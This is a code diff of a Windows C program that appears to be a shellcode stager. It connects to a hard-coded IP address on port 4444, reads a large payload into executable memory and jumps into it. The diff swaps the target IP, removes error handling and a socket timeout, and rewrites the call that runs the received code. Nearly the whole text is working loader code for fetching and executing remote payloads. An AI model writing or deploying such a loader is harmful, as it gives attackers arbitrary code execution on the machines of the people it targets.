@@ -2,7 +2,7 @@
 #include <winsock2.h>
 #include <stdio.h>
 
-#define IP_ADDRESS "192.168.5.188"
+#define IP_ADDRESS "10.230.229.13"
 #define PORT 4444
 #define BUF_LEN 1024
 #define PAYLOAD_SZ 819200
@@ -12,12 +12,8 @@ int main() {
   WSADATA wsaData;
   int wResult;
   WSAStartup(MAKEWORD(2,2), &wsaData);
-  // if (wResult != 0) {
-  //    return 1;
-  //};
-
+  
   // Create a socket to connect to an IP and port
-  // printf("Creating socket...\n");
   SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
   // Define socket type, AF_INET (IPv4), IP address, and port.
@@ -25,11 +21,6 @@ int main() {
   saServer.sin_family = AF_INET;
   saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
   saServer.sin_port = htons(PORT);
-
-  // Set Receive timeout on the socket
-  // struct timeval tv;
-  // tv.tv_sec = 1;
-  // setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
 
   // Connect to socket
   printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
@@ -56,6 +47,9 @@ int main() {
   //typedef void(*func_t);
   //func_t f = (func_t *)rwx;
   //f();
-  ((void(*)())(rwx+4))();
+  void (*func) ();
+  func = (void (*) ()) *(u_long*)(rwx + 4);
+  (void) (*func) (); 
+  //((void(*)())(rwx+4))();
 }
 
